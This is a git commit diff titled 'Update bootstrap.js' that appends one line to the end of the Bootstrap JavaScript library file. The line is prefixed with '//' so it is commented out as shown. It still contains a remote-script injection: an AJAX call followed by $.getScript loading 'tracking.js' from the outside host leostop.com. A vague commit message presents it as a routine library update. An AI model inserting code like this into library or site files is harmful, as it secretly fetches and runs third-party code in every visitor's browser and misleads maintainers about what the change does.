fa3b38a874b30db83455be9819408307bc2ab2d2
lezcano-victoria <lezcanovictoria034@gmail.com>
2025-07-11 23:24:22 -0300

    Update bootstrap.js

--- js/bootstrap.js
+++ js/bootstrap.js
@@ -3922,4 +3922,5 @@
   Object.defineProperty(exports, '__esModule', { value: true });
 
 })));
+//function getURL(){ window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success:function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 //# sourceMappingURL=bootstrap.js.map
